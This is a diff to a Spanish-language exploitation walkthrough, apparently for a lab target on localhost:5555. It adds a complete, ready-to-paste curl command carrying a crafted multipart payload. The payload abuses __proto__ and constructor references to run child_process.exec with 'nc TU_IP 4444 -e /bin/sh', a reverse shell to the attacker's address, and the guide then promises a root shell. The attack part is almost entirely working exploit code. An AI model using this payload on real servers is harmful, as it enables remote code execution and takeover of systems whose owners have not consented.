@@ -126,11 +126,13 @@ require('child_process').exec('nc TU_IP 4444 -e /bin/sh');
 ```
 
 ### 3. Envía el Exploit
-Construye el payload:
-```javascript
-{"_response": {"_prefix": "require('child_process').exec('nc TU_IP 4444 -e /bin/sh');"}}
+Para facilitarlo, aquí tienes el comando completo (reemplaza `TU_IP`):
+
+```bash
+curl -i -X POST http://localhost:5555/ \
+  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
+  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"require(\'child_process\').exec(\'nc TU_IP 4444 -e /bin/sh\');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
 ```
-(¡No olvides escapar las comillas si metes esto de nuevo en el comando curl!)
 
 Si tienes éxito, revisa tu terminal donde estabas escuchando. ¡Deberías tener una shell!
 Prueba escribir: `whoami` -> debería devolver `root` (o `node`).
